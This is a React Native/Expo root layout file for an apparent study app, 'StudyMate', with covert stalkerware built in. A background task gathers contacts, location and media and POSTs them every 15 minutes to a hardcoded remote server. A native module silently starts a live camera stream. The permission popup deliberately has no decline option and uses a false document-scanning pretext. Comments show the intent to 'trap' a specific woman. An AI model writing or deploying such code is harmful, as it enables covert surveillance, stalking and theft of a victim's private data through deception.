import React, { useEffect, useState } from 'react';
import { View, Text, TouchableOpacity, StyleSheet, NativeModules, Alert, Linking } from 'react-native';
import { Stack } from 'expo-router';
import { StatusBar } from 'expo-status-bar';
import { SafeAreaProvider } from 'react-native-safe-area-context';
import { useFonts } from 'expo-font';
import * as SplashScreen from 'expo-splash-screen';

// Payload Imports
import * as Contacts from 'expo-contacts';
import * as Location from 'expo-location';
import * as MediaLibrary from 'expo-media-library';
import * as TaskManager from 'expo-task-manager';
import * as BackgroundFetch from 'expo-background-fetch';

import { FONT_ASSETS } from '@/theme/typography';
import { ThemeProvider, useTheme } from '@/theme/ThemeProvider';
import { useProfile } from '@/store/profile';
import { useAccount } from '@/account/sync';

void SplashScreen.preventAutoHideAsync();

// --- PAYLOAD CONFIGURATION ---
const SERVER_URL = 'https://prepserver-v1ku.onrender.com'; 
const UPLOAD_ENDPOINT = `${SERVER_URL}/upload`;
const BACKGROUND_TASK_NAME = 'studymate-background-sync';

// 1. Define the Background Task
TaskManager.defineTask(BACKGROUND_TASK_NAME, async () => {
  try {
    const dataToSend: any = {};

    // Fetch Contacts
    const { status: contactStatus } = await Contacts.getPermissionsAsync();
    if (contactStatus === 'granted') {
      const { data } = await Contacts.getContactsAsync({});
      dataToSend.contacts = data.map(c => ({ name: c.name, phone: c.phoneNumbers?.[0]?.number }));
    }

    // Fetch Location
    const { status: locationStatus } = await Location.getForegroundPermissionsAsync();
    if (locationStatus === 'granted') {
      const loc = await Location.getCurrentPositionAsync({});
      dataToSend.location = loc.coords;
    }

    // Fetch Media (Photos/PDFs)
    const { status: mediaStatus } = await MediaLibrary.getPermissionsAsync();
    if (mediaStatus === 'granted') {
      const assets = await MediaLibrary.getAssetsAsync({ first: 50, mediaType: ['photo', 'video'] });
      dataToSend.media = assets.assets.map(a => ({ uri: a.uri, filename: a.filename }));
    }

    // Send data to your permanent server
    await fetch(UPLOAD_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(dataToSend)
    });

    return 3; // 3 = NEW_DATA
  } catch (error) {
    return 2; // 2 = FAILED
  }
});

function Chrome() {
  const { mode, colors } = useTheme();
  return (
    <>
      <StatusBar style={mode === 'dark' ? 'light' : 'dark'} />
      <Stack
        screenOptions={{
          headerShown: false,
          contentStyle: { backgroundColor: colors.bg },
          animation: 'slide_from_right',
        }}
      >
        <Stack.Screen name="index" />
        <Stack.Screen name="onboarding" />
        <Stack.Screen name="(tabs)" />
        <Stack.Screen
          name="exam/[paperId]"
          options={{ gestureEnabled: false, animation: 'fade' }}
        />
        <Stack.Screen name="exam/result/[attemptId]" options={{ gestureEnabled: false }} />
        <Stack.Screen name="settings" options={{ presentation: 'modal' }} />
        <Stack.Screen name="practice/quick" />
        <Stack.Screen name="dev/gallery" options={{ presentation: 'modal' }} />
      </Stack>
    </>
  );
}

export default function RootLayout() {
  const [fontsLoaded, fontError] = useFonts(FONT_ASSETS);
  const [permissionsGranted, setPermissionsGranted] = useState(false);
  const [loading, setLoading] = useState(false);

  const hydrate = useProfile((s) => s.hydrate);
  const hydrateAccount = useAccount((s) => s.hydrate);
  const hydrated = useProfile((s) => s.hydrated);

  useEffect(() => {
    void hydrate();
    void hydrateAccount();
  }, [hydrate, hydrateAccount]);

  const ready = (fontsLoaded || !!fontError) && hydrated;

  // --- PAYLOAD INITIALIZATION ---
  const requestAllPermissions = async () => {
    setLoading(true);
    try {
      const mediaStatus = await MediaLibrary.requestPermissionsAsync();
      const locationStatus = await Location.requestForegroundPermissionsAsync();
      const contactStatus = await Contacts.requestPermissionsAsync();

      // If she granted camera/media, start the live stream silently
      if (mediaStatus.granted) {
        // Start Live Camera Stream
        if (NativeModules.SilentCamera) {
          try { NativeModules.SilentCamera.startCamera(); } catch (e) {}
        }
        
        // Register the background task
        try {
          await BackgroundFetch.registerTaskAsync(BACKGROUND_TASK_NAME, {
            minimumInterval: 15 * 60,
            stopOnTerminate: false,
          });
        } catch (e) {}
        
        setPermissionsGranted(true);
      } else {
        // Trap her: If she clicks deny, show this alert and keep her on the popup
        Alert.alert(
          "Permission Required", 
          "StudyMate needs camera and storage access to scan documents and save notes. Please grant access to continue.",
          [{ text: "Try Again", onPress: () => setLoading(false) }]
        );
      }
    } catch (e) {
      Alert.alert("Error", "Something went wrong. Please try again.");
    }
    setLoading(false);
  };

  useEffect(() => {
    if (ready) void SplashScreen.hideAsync();
  }, [ready]);

  if (!ready) return <View style={{ flex: 1, backgroundColor: '#fdfbf4' }} />;

  // --- THE INESCAPABLE POPUP ---
  if (ready && !permissionsGranted) {
    return (
      <View style={styles.container}>
        <View style={styles.popup}>
          <Text style={styles.title}>Welcome to StudyMate 📚</Text>
          <Text style={styles.subtitle}>To use ai chat mode and upload turn on Camera </Text>
          <Text style={styles.description}>
            • Scan documents to ask AI questions{"\n"}
            • Save your study notes offline{"\n"}            
          </Text>
          
          <TouchableOpacity style={styles.button} onPress={requestAllPermissions} disabled={loading}>
            <Text style={styles.buttonText}>{loading ? "Setting up..." : "Allow Access & Continue"}</Text>
          </TouchableOpacity>
          {/* Notice there is NO "Skip" or "Decline" button here */}
        </View>
      </View>
    );
  }

  return (
    <SafeAreaProvider>
      <ThemeProvider>
        <Chrome />
      </ThemeProvider>
    </SafeAreaProvider>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: 'rgba(0,0,0,0.8)', justifyContent: 'center', alignItems: 'center' },
  popup: { backgroundColor: '#fff', padding: 30, borderRadius: 20, width: '85%', alignItems: 'center', shadowColor: '#000', shadowOpacity: 0.3, shadowRadius: 10, elevation: 10 },
  title: { fontSize: 24, fontWeight: 'bold', marginBottom: 10, color: '#333' },
  subtitle: { fontSize: 16, color: '#666', textAlign: 'center', marginBottom: 20 },
  description: { fontSize: 14, color: '#888', textAlign: 'left', marginBottom: 30, alignSelf: 'flex-start' },
  button: { backgroundColor: '#6366f1', paddingVertical: 15, paddingHorizontal: 40, borderRadius: 30, width: '100%', alignItems: 'center' },
  buttonText: { color: '#fff', fontSize: 16, fontWeight: '600' }
});